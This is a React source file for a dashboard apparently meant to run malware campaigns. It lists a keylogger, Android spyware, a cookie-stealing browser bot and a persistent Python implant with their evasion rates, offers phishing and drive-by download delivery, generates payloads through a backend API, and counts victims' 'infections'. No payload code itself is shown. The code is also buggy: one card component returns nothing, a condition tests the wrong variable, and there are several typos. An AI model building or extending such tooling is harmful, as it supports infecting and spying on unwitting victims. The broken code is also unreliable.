import React, {useState, useEffect} from 'react'
import { motion, AnimatePresence, setDragLock} from 'framer-motion'
import {
    Package,
    Download,
    Upload,
    Code,
    Globe,
    Smartphone,
    Server,
    Play,
    Copy,
    RefreshCw,
    Eye,
    Trash2,
    BarChart3,
    EqualApproximatelyIcon
} from 'lucide-react'
import { apiUtils, deliveryApi} from '../../utils/api'


const DeliverySystem = () => {
    const [campaigns, setCampaigns] = useState([]);
    const [isLoading, setIsLoading] = useState(true);
    const [selectedPlatform, setSelectedPlatform] = useState('windows');
    const [newCampaign, setNewCampaign] = useState({
        name: '',
        delivery_method: 'web',
        target_url: '',
        payload_type: 'javascript'
    });
    const [generatedPayload, setGeneratedPayload] = useState('');

    const fetchCampaigns = async () => {
      try {
        setIsLoading(true);
        const response = await deliveryApi.getAll();
        setCampaigns(response.data.results || response.data);
      } catch (error) {
        console.error('Failed to fetch campaigns: ', error);
      } finally {
        setIsLoading(false);
      }
    };

    useEffect(() => {
      fetchCampaigns();
      const interval = setInterval(fetchCampaigns, 30000) // Every 30 seconds
      return () => clearInterval(interval);
    }, []);

    const createCampaign = async (e) => {
      e.preventDefault();
      try {
        await deliveryApi.createWebDelivery(newCampaign);
        setNewCampaign({
          name: '',
          delivery_method: 'web', 
          target_url: '',
          payload_type: 'javascript'
        });
        fetchCampaigns() // refresh list
      } catch (error) {
        console.error('Failed to create campaigb: ', error);
      }
    };

    const generatePayload = async (campaignId, payloadType) => {
      try {
        const response = await deliveryApi.generatePayload(campaignId, payloadType);
        setGeneratedPayload(response.data.payload);
      } catch (error) {
        console.error('Failed to generate payload: ', error);
      }
    };

    const copyToClipboard = (text) => {
      navigator.clipboard.writeText(text);
    };

    const payloads = [
      {
        id: 1,
        name: 'Windows Keylogger',
        platform: 'Windows',
        type: 'executable',
        size: '2.3 MB',
        detection_rate: '15%',
        capabilities: ['keylogging', 'screenshot', 'data_exfiltration']
      },
      {
        id: 2,
        name: 'Android Spyware',
        platform: 'android',
        type: 'apk',
        size: '4.1 MB',
        detection_rate: '22%',
        capabilities: ['sms_capture', 'location_tracking', 'call_recording']
      },
      {
        id: 3,
        name: 'Web Browser Bot',
        platform: 'web',
        type: 'javascript',
        size: '15.2 KB',
        detection_rate: '8%',
        capabilities: ['cookie_stealing', 'form_grabbing', 'session_hijacking']
      },
      {
        id: 4,
        name: 'Python Implant',
        platform: 'cross',
        type: 'pythion',
        size: '45.6 KB',
        detection_rate: '12%',
        capabilities: ['persistence', 'remote_control', 'data_collection']
      },
    ];

    const deliveryMethods = [
      {
        id: 1,
        name: 'Phishing Email',
        icon: Upload,
        description: 'Send malicious attachments via email campaigns',
        success_rate: '85%',
        platforms: ['windows', 'android', 'web']
      },
      {
        id: 2,
        name: 'Drive-by Download',
        icon: Download,
        description: 'Automatic download from a compromised websites',
        success_rate: '70%',
        platforms: ['windows', 'web']
      },
      {
        id: 3,
        name: 'Social Medial',
        icon: Globe,
        description: 'Distribution through social media platforms',
        success_rate: '90%',
        platforms: ['windows', 'android', 'ios']
      },
      {
        id: 4,
        name: 'Malware Distribution',
        icon: Package,
        description: 'Direct malware distribution networks',
        success_rate: '65%',
        platforms: ['windows', 'android']
      }
    ];

    const PayloadCard = ({payload}) => {
      const getPlatformIcon = (platform) => {
        const iconMap = {
          'windows': Server,
          'android': Smartphone,
          'web': Globe,
          'cross': Code
        };
        return iconMap[platform] || Code
      }

      const PlatformIcon = getPlatformIcon(payload.platform);

      return (
        <motion.div
          whileHover={{ y: -5}}
          className='p-6 bg-gray-800 rounded-xl border border-gray-700'
        >
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-3">
              <div className="p-2 bg-gray-700 rounded-lg">
                <PlatformIcon size={20} className='text-cyan-500'></PlatformIcon>
              </div>
              <div>
                <h3 className="font-semibold">{payload.name}</h3>
                <p className="text-sm text-gray-400 capitalize">
                  {payload.platform} • {payload.type}
                </p>
              </div>
            </div>
            <span className={`px-2 py-1 rounded text-xs ${
              parseInt(payload.detection_rate) < 20
                ? 'bg-green-500/20 text-green-500'
                : 'bg-yellow-500/20 text-yellow-500'
            }`}>
              Detection: {payload.detection_rate}
            </span>
          </div>

          <div className="space-y-2 text-sm mb-4">
            <div className="flex justify-between">
              <span className="text-gray-400">Size: </span>
              <span>{payload.size}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-400">Platform: </span>
              <span className="capitalize">{payload.platform}</span>
            </div>
          </div>

          {/* capabilites */}
          <div className="mb-4">
            <div className="flex flex-wrap gap-1">
              {payload.capabilities.map((capability, index) => (
                <span key={index} className="px-2 py-1 bg-cyan-500/20 text-cyan-500 text-xs rounded">
                  {capability.replace('_', ' ')}
                </span>
              ))}
            </div>
          </div>

          <div className="flex space-x-2">
            <motion.button
              whileHover={{ scale: 1.05}}
              whileTap={{ scale: 0.95}}
              className='flex-1 py-2 bg-cyan-600 rounded-lg font-semibold'
              onClick={() => generatePayload(payload.id, payload.type)}
            >
              Generate
            </motion.button>
            <motion.button
              whileHover={{ scale: 1.05}}
              whileTap={{ scale: 0.95}}
              className='flex-1 py-2 bg-gray-700 rounded-lg font-semibold'
            >
              Configure
            </motion.button>
          </div>
        </motion.div>
      );
    };

    const DeliveryMethod = ({ method}) => {
      const Icon = method.icon;

      return (
        <motion.div
          whileHover={{ scale: 1.05}}
          className='p-6 bg-gray-800 rounded-xl border border-gray-700 cursor-pointer'
        >
          <div className="flex items-center space-x-2 mb-3">
            <div className="p-2 bg-cyan-500/20 rounded-lg">
              <Icon size={20} className='text-cyan-500'></Icon>
            </div>
            <h3 className="font-semibold">{method.name}</h3>
          </div>

          <p className="text-gray-400 text-sm mb-4">{method.description}</p>

          <div className="flex justify-between items-center mb-3">
            <span className="text-sm text-gray-400">Success Rate: </span>
            <span className="font-semibold text-green-500">{method.success_rate}</span>
          </div>

          <div className="flex flex-wrap gap-1 mb-4">
            {method.platforms.map((platform, index) => (
              <span key={index} className="px-2 py-1 bg-gray-700 text-gray-300 text-xs rounded">
                {platform}
              </span>
            ))}
          </div>

          <motion.button
            whileHover={{ scale: 1.05}}
            whileTap={{ scale: 0.95}}
            className='w-full py-2 bg-cyan-600 rounded-lg font-semibold flex items-center justify-around space-x-2'
          >
            <Play size={16}></Play>
            <span>Deploy</span>
          </motion.button>
        </motion.div>
      );
    };
    
    const CampaignCard = ({campaign}) => {
      <motion.div
        whileHover={{ y: -2}}
        className='p-4 bg-gray-800 rounded-xl border border-gray-700'
      >
        <div className="flex items-center justify-between mb-31">
          <div>
            <h3 className="font-semibold">{campaign.name}</h3>
            <p className="text-sm text-gray-400">
              {campaign.delivery_method_display} • {campaign.payload_type_display}
            </p>
          </div>
          <span className={`px-2 py-1 rounded text-xs ${
            campaign.is_active 
              ? 'bg-green-500/20 text-green-500'
              : 'bg-gray-500/20 text-gray-500'
          }`}>
            {campaign.status}
          </span>
        </div>

        <div className="space-y-2 text-sm mb-3">
          <div className="flex justify-between">
            <span className="text-gray-400">Target: </span>
            <span className="text-right">{campaign.target_url || 'N/A'}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-400">Infections: </span>
            <span className="text-right">{campaign.infections }</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-400">Infection Rate: </span>
            <span className="text-right">{campaign.infection_rate}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-400">Created: </span>
            <span className="text-right">{campaign.created_at_humanized || new Date(campaign.created_at).toLocaleDateString()}</span>
          </div>                              
        </div>

        <div className="flex space-x-2">
          <motion.button
            whileHover={{ scale: 1.05}}
            whileTap={{ scale: 0.95}}
            className='flex py-2 bg-cyan-600 rounded-lg font-semibold text-sm'
          >
            Generate Payload
          </motion.button>
          <motion.button
            whileHover={{ scale: 1.05}}
            whileTap={{ scale: 0.95}}
            className='px-3 py-2 bg-gray-700 rounded-lg'
          >
            <Eye size={16}></Eye>
          </motion.button>
          <motion.button
            whileHover={{ scale: 1.05}}
            whileTap={{ scale: 0.95}}
            className='px-3 py-2 bg-red-600 rounded-lg'
          >
            <Trash2 size={16}></Trash2>
          </motion.button>
        </div>
      </motion.div>
    };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 py-12">
      <div className="max-w-6xl mx-auto p-6 space-y-6">
        <motion.div
          initial={{ opacity: 0, y: -20}}
          animate={{ opacity: 1, y: 0}}
          className='flex justify-between items-center'
        >
          <div>
            <h1 className="text-3xl font-bold">Delivery System</h1>
            <p className="text-gray-400">
              {campaigns.length} active campaigns • {campaigns.reduce((acc, c) => acc + c.infections, 0)} total infections
            </p>
          </div>
          <div className="flex space-x-4">
            <motion.button
              whileHover={{ scale: 1.05}}
              whileTap={{ scale: 0.95}}
              onClick={fetchCampaigns}
              className='px-4 py-2 bg-gray-700 rounded-lg font-semibold flex items-center space-x-2'
            >
              <RefreshCw size={20}></RefreshCw>
              <span>Refresh</span>
            </motion.button>
          </div>
        </motion.div>
        
        {/* Platform Selection */}
        <motion.div
          initial={{ opacity: 0, x: -20}}
          animate={{ opacity: 1, x: 0}}
          className='bg-gray-800 rounded-xl p-6 border border-gray-700'
        >
          <h3 className="text-lg font-semibold mb-4">Target Platform</h3>
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            {[
              {id: 'windows', name: 'Windows', icon: Server},
              {id: 'android', name: 'Android', icon: Smartphone},
              {id: 'web', name: 'Web', icon: Globe},
              {id: 'cross', name: 'Cross-Platform', icon: Code}
            ].map(platform => {
              const Icon = platform.icon
              return (
                <motion.button
                  key={platform.id}
                  whileHover={{ scale: 1.05}}
                  whileTap={{ scale: 0.95}}
                  onClick={() => setSelectedPlatform(platform.id)}
                  className={`p-4 rounded-lg border-2 flex flex-col items-center space-y-2 ${
                    selectedPlatform === platform.id 
                      ? 'border-cyan-500, bg-cyan-500/10'
                      : 'border-gray-700 bg-gray-700/50'
                  }`}
                >
                  <Icon size={24}></Icon>
                  <span>{platform.name}</span>
                </motion.button>
              )
            })}
          </div>
        </motion.div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Available payloads */}
          <motion.div
            initial={{ opacity: 0, x: -20}}
            animate={{ opacit: 1, x: 0}}
          >
            <h2 className="text-xl font-semibold mb-4">Availabel Payloads</h2>
            <div className="space-y-4">
              {payloads
                .filter(p => p.platform === selectedPlatform || selectedPlatform === 'cross')
                .map(payload => (
                  <PayloadCard key={payload.id} payload={payload}></PayloadCard>
                ))}
            </div>
          </motion.div>

          {/* Delivery Methods */}
          <motion.div
            initial={{ opacity: 0, x: 20}}
            animate={{ opacity: 1, x: 0}}
          >
            <h2 className="text-xl font-semibold mb-4">Delivery Methods</h2>
            <div className="space-y-4">
              {deliveryMethods.map(method => (
                <DeliveryMethod key={method.id} method={method}></DeliveryMethod>
              ))}
            </div>
          </motion.div>
        </div>

        {/* New campaign form */}
        <motion.div
          initial={{ opacity: 0, y: 20}}
          animate={{ opacity: 1, y: 0}}
          className='bg-gray-800 rounded-xl p-6 border border-gray-700'
        >
          <h3 className="text-lg font-semibold mb-4">Create New Delivery Campaign</h3>
          <form onSubmit={createCampaign} className='grid grid-cols-1 md:grid-cols-2 gap-4'>
            <div>
              <label className='block text-sm font-medium text-gray-400 mb-2'>
                Campaign Name
              </label>
              <input
                type='text'
                value={newCampaign.name}
                onChange={(e) => setNewCampaign({...newCampaign, name: e.target.value})}
                placeholder='Summer Campaign 2025'
                className='w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500'
                required
              ></input>
            </div>
            <div>
              <label className='block text-sm font-medium text-gray-400 mb-2'>
                Delivery Method
              </label>
              <select
                value={newCampaign.delivery_method}
                onChange={(e) => setNewCampaign({...newCampaign, delivery_method: e.target.value})}
                className='w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500'
              >
                <option value='web'>Web Delivery</option>
                <option value='email'>Email Phishing</option>
                <option value='social'>Social Media</option>
                <option value='malware'>Malware Distribution</option>
              </select>
            </div>
            <div>
              <label className='block text-sm font-medium text-gray-400 mb-2'>
                Target URL
              </label>
              <input
                type='url'
                value={newCampaign.target_url}
                onChange={(e) => setNewCampaign({...newCampaign, target_url: e.target.value})}
                placeholder='https://target-website.com'
                className='w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500'
              ></input>
            </div>
            <div>
              <label className='block text-sm font-medium text-gray-400 mb-2'>
                Payload Type
              </label>
              <select
                value={newCampaign.payload_type}
                onChange={(e) => setNewCampaign({...newCampaign, payload_type: e.target.value})}
                className='w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500'
              >
                <option value='javascript'>JavaScript Bot</option>
                <option value='python'>Python Script</option>
                <option value='executable'>Windows Executable</option>
                <option value='mobile'>Mobile Application</option>
              </select>
            </div>
            <div className="md:col-span-2">
              <motion.button
                type='submit'
                whileHover={{ scale: 1.05}}
                whileTap={{ scale: 0.95}}
                className='w-full py-3 bg-cyan-600 rounded-lg font-semibold flex items-center justify-center space-x-2'
              >
                <Package size={20}></Package>
                <span>Create Campaign</span>
              </motion.button>
            </div>
          </form>
        </motion.div>
        
        {/* Active campaigns */}
        <motion.div
          initial={{ opacity: 0, y: 20}}
          animate={{ opacity: 1, y: 0}}
          className='bg-gray-800 rounded-xl p-6 border border-gray-700'
        >
          <h3 className="text-lg font-semibold mb-4 flex items-center space-x-2">
            <BarChart3 size={20}></BarChart3>
            <span>Active Delivery Campaigns</span>
            <span className="bg-cyan-500/20 text-cyan-500 text-sm px-2 py-1 rounded">
                {campaigns.filter(c => c.is_active).length}
            </span>
          </h3>

          {isLoading ? (
            <div className="flex justify-center items-center py-12">
              <RefreshCw size={32} className='animate-spin text-cyan-500'></RefreshCw>
              <span className="ml-2 text-gray-400">Loading Campaigns...</span>
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grie-cols-3 gap-4">
              {campaigns.map(campaign => (
                <CampaignCard key={campaign.id} campaign={campaign}></CampaignCard>
              ))}
              {campaigns.length === 0 && (
                <div className="md:col-span-3 text-center py-12">
                  <Package size={48} className='mx-auto mb-4 text-gray-400 opacity-50'></Package>
                  <h3 className="text-xl font-semibold text-gray-400">No campaigns yet</h3>
                  <p className="text-gray-500">Create your first delivery campaign to get started</p>
                </div>
              )}
            </div>
          )}
        </motion.div>
        
        {/* Generated Payload */}
        {generatePayload && (
          <motion.div>
            <h3 className="text-lg font-semibold mb-4 flex items-center justify-between">
              <span>Generated Payload</span>
              <motion.button
                whileHover={{ scale: 1.05}}
                whileTap={{ scale: 0.95}}
                onClick={() => copyToClipboard(generatedPayload)}
                className='px-4 py-2 bg-cyan-600 rounded-lg font-semibold flex items-center space-x-2'
              >
                <Copy size={16}></Copy>
                <span>Copy to Clipboard</span>
              </motion.button>
            </h3>
            <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm max-h-60 overflow-y-auto">
              <pre>{generatedPayload}</pre>
            </div>
          </motion.div>
        )}

        {/* Deployment Stats */}
        <motion.div
          initial={{ opacity: 0, y: 20}}
          animate={{ opacity: 1, y: 0}}
          className='bg-gray-800 rounded-xl p-6 border border-gray-700'
        >
          <h3 className="text-lg font-semibold mb-4">Deployment Statistics</h3>
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            <StatCard label='Total Campaigns' value={campaigns.length} color='#00c49g'></StatCard>
            <StatCard label='Successful Infections' value={campaigns.reduce((acc, c) => acc + c.infections, 0)} color='#00c49f'></StatCard>
            <StatCard label='Active Campaigns' value={campaigns.filter(c => c.is_active).length} color='#0088fe'></StatCard>
            <StatCard label='Success Rate' value='78.9%' color='#ffbb28'></StatCard>
          </div>
        </motion.div>
      </div>
    </div>
  );
};

const StatCard = ({label, value, color}) => (
  <div className="text-center p-4 bg-gray-700 rounded-lg">
    <div className="text-2xl font-bold mb-1" style={{ color}}>{value}</div>
    <div className="text-sm text-gray-400">{label}</div>
  </div>
);

export default DeliverySystem